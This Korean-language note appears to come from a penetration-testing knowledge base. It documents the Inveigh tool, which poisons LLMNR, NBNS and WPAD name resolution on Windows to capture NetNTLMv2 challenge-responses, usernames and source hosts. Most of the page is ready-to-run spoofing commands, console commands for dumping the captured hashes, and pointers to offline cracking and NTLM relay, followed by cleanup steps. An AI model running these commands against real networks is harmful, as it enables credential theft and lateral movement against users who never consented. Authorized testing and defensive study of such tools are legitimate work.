---
tags:
  - 환경/windows
  - 서비스/llmnr
  - 기능/자격증명수집
실행환경: ["Windows"]
필요권한: ["패킷 캡처와 수신 포트 바인딩이 가능한 로컬 관리자 권한"]
필요조건: ["이름 해석 요청을 관찰할 수 있는 네트워크 위치", "Inveigh.ps1 또는 Inveigh.exe"]
결과: ["이름 해석 요청", "NetNTLM challenge-response", "사용자 및 출발지 정보"]
---

# Inveigh

## 도구 개요

Inveigh는 Windows에서 LLMNR·NBNS·mDNS·WPAD 이름 해석 요청을 관찰하거나 응답해 NetNTLM 인증 자료와 사용자·출발지 정보를 수집한다. PowerShell 구현과 C# 실행 파일은 실행·콘솔 문법이 다르며, 캡처한 NetNTLM challenge-response는 계정의 NTLM hash 자체가 아니다.

## 필요한 입력과 실행 환경

- 실행 환경: 대상 요청을 관찰할 수 있는 Windows 호스트
- 입력: legacy PowerShell 구현의 `Inveigh.ps1` 또는 C# 구현의 `Inveigh.exe`
- 권한 조건: 패킷 캡처와 HTTP/HTTPS/SMB 등의 수신 포트 바인딩이 가능한 로컬 관리자 권한
- 네트워크 조건: LLMNR/NBNS 요청이 도달하는 위치와 응답에 사용할 로컬 인터페이스

## 표준 사용법

### Legacy PowerShell 구현

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C# 구현

```powershell
.\Inveigh.exe [options]
```

실행 중 `ESC`로 대화형 콘솔에 들어간 뒤 `GET NTLMV2UNIQUE`, `GET NTLMV2USERNAMES`, `STOP` 같은 콘솔 명령을 사용한다.

## 대표 예시

### Legacy PowerShell로 LLMNR/NBNS 캡처

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

확인할 출력:

- `Inveigh <VERSION> started`, `LLMNR Spoofer = Enabled`, `NBNS Spoofer ... = Enabled`
- `SMB Capture = Enabled`, `HTTP Capture = Enabled`, `File Output = Enabled`
- 종료 안내인 `Run Stop-Inveigh to stop`

### C# 구현에서 응답 없이 먼저 관찰

```powershell
.\Inveigh.exe -?
.\Inveigh.exe -Inspect Y -FileOutput N -RunTime <MINUTES>
```

확인할 출력:

- `Packet Sniffer Addresses`, `Listener Addresses`, `Spoofer Reply Addresses`
- `Inspect`가 활성화되고 spoofing 응답을 보내지 않는 상태
- `Press ESC to enter/exit interactive console`

요청이 확인된 뒤 C# 실행을 종료하고, 작업 전 없던 고유 output directory를 만들어 LLMNR·NBNS만 명시적으로 활성화한다. `-FileDirectory`, `-FilePrefix`, `-RunTime` 지원 여부는 같은 build의 `-?`에서 확인한다.

```powershell
Test-Path -LiteralPath '<INVEIGH_RUN_DIRECTORY>'
New-Item -ItemType Directory -Path '<INVEIGH_RUN_DIRECTORY>'
.\Inveigh.exe -LLMNR Y -NBNS Y -DNS N -MDNS N -DHCPv6 N -ICMPv6 N -HTTP Y -HTTPS N -LDAP N -Proxy N -WebDAV N -SMB Y -FileOutput Y -FileDirectory '<INVEIGH_RUN_DIRECTORY>' -FilePrefix 'inveigh-<UNIQUE_ID>' -RunTime <MINUTES>
```

`Test-Path`가 `False`일 때만 directory를 만든다. 이미 존재하면 다른 고유 경로를 선택하고 기존 directory를 재사용하지 않는다.

확인할 출력:

- 시작 줄의 `<INVEIGH_PID>`와 `File Output [<INVEIGH_RUN_DIRECTORY>]`.
- `[+] LLMNR`, `[+] NBNS`, HTTP·SMB capture와 사용하지 않는 spoofer·listener의 비활성 표시.
- `response sent`와 실제 `NTLMv1`·`NTLMv2` capture는 별도 상태다.

### C# 콘솔에서 고유 NTLMv2 hash 확인

```text
GET NTLMV2UNIQUE
```

확인할 출력:

- `Unique NTLMv2 Hashes` 표제와 사용자별 하나의 NetNTLMv2 challenge-response

### C# 콘솔에서 사용자와 출발지 확인

```text
GET NTLMV2USERNAMES
```

확인할 출력:

- `IP Address`, `Host`, `Username`, `Challenge` 열

## 주요 옵션과 콘솔 명령

| 구현 | 옵션·명령 | 의미 |
|---|---|---|
| PowerShell | 첫 번째 위치 인수 `Y` | 근거 예시에서 legacy LLMNR spoofing 활성화 |
| PowerShell | `-NBNS Y` | NBNS spoofing 활성화 |
| PowerShell | `-ConsoleOutput Y` | 실시간 콘솔 출력 활성화 |
| PowerShell | `-FileOutput Y` | 캡처 결과 파일 저장 활성화 |
| C# 콘솔 | `GET NTLMV2UNIQUE` | 사용자별 고유 NTLMv2 hash 확인 |
| C# 콘솔 | `GET NTLMV2USERNAMES` | 캡처 사용자와 출발지 호스트·IP 확인 |
| C# 콘솔 | `RESUME` | 실시간 콘솔 출력으로 복귀 |
| C# 콘솔 | `STOP` | C# Inveigh 종료 |
| C# | `-Inspect Y` | traffic만 관찰하고 spoofing하지 않음 |
| C# | `-FileDirectory <PATH>` | file output을 기록할 고유 directory 지정 |
| C# | `-FilePrefix <PREFIX>` | 이번 실행 output 식별 prefix 지정 |
| C# | `-RunTime <MINUTES>` | 지정한 분 뒤 자동 종료 |
| C# | `-FileOutput Y` | 이번 실행의 capture를 지정한 directory에 기록 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `[response sent]` | 해당 이름 해석 요청에 spoofing 응답 전송 | 이후 NTLM 인증과 hash 캡처 여부 확인 |
| `Unique NTLMv2 Hashes` | 중복을 제거한 NetNTLMv2 challenge-response 확보 | [[오프라인 해시 크래킹]] 또는 relay 조건 검토 |
| `NTLMv2 Usernames` | 사용자, 출발지 IP·호스트, challenge 매핑 확보 | 계정 중요도와 출발지 시스템 확인 |
| `[type ignored]` 또는 `[spoofer disabled]` | 요청은 관찰했지만 유형이 제외되었거나 응답 기능 비활성 | 시작 옵션과 응답 대상 프로토콜 확인 |
| `Error starting HTTP listener` | 권한 부족 또는 다른 프로세스와 수신 포트 충돌 | 관리자 권한과 HTTP/HTTPS/SMB 포트 점유 확인 |
| 요청은 보이지만 hash 없음 | 이름 해석 요청 이후 NTLM 인증이 발생하지 않음 | 인증 유도 조건, 캐시, 대상 프로토콜 확인 |

## 버전과 환경 차이

- `Inveigh.ps1`은 PowerShell 구현이며 `Import-Module`, `Invoke-Inveigh`, `Stop-Inveigh` 같은 cmdlet 문법을 사용한다.
- `Inveigh.exe`는 C# 구현이다. 독립 실행 파일로 시작하고 `ESC`로 여는 대화형 콘솔에서 `GET ...`, `RESUME`, `STOP` 명령을 사용한다.
- C# 대화형 콘솔 명령을 legacy PowerShell 세션에 입력하거나 PowerShell cmdlet을 C# 실행 파일 옵션으로 사용하지 않는다.
- 배포 archive는 대상 Windows와 .NET runtime에 맞는 빌드를 선택한다. C# archive에 `Inveigh.ps1`이 없는 것은 두 구현이 별도 산출물이기 때문이다.

## 종료와 산출물 정리

PowerShell 구현은 `Stop-Inveigh`, C# 구현은 대화형 console의 `STOP`으로 먼저 정상 종료한다. C# 시작 줄의 exact `<INVEIGH_PID>`와 작업 전 listener 기준을 사용하며 이름만으로 모든 Inveigh·PowerShell process를 종료하지 않는다.

```powershell
Get-Process -Id <INVEIGH_PID> -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,Path
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
Get-ChildItem -LiteralPath '<INVEIGH_RUN_DIRECTORY>' -File | Select-Object FullName,Length,LastWriteTime
```

PID 조회가 비고 listener가 작업 전 상태로 돌아와야 process·listener 정리가 확인된다. 고유 run directory는 보존·인계가 끝난 뒤 그 안에서 이번 prefix로 생성된 exact 파일만 제거하고, directory가 비었을 때만 제거한다.

```powershell
Get-ChildItem -LiteralPath '<INVEIGH_RUN_DIRECTORY>' -File -Filter 'inveigh-<UNIQUE_ID>*'
Remove-Item -LiteralPath '<INVEIGH_OUTPUT_FILE>' -Force
Remove-Item -LiteralPath '<INVEIGH_RUN_DIRECTORY>'
Test-Path -LiteralPath '<INVEIGH_RUN_DIRECTORY>'
```

마지막 결과가 `False`여야 local 산출물 정리가 끝난 것이다. legacy PowerShell 구현을 기존 directory에서 `-FileOutput Y`로 실행해 기존 파일이 append된 경우에는 파일 전체를 삭제하거나 truncate하지 않는다. 작업 전 byte 경계를 보존하지 않았다면 그 파일은 `정리 미확인`으로 남긴다.

## 관련 공격기법

- [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]]
- [[NTLM Relay 조건 검토]]
- [[DnsAdmins WPAD DNS 레코드로 NTLM 인증 유도]]

## 참고 링크

- [Kevin Robertson: Inveigh](https://github.com/Kevin-Robertson/Inveigh)
